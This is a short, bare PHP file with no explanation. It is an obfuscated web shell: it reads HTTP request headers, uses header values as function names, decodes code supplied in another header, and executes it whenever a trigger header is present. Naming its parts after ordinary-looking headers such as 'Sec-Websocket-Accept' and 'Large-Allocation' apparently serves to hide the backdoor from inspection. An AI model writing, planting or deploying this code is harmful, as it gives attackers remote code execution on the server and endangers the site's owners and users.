<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $sys = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Large-Allocation']($_HEADERS['If-Unmodified-Since']));
    $sys();
}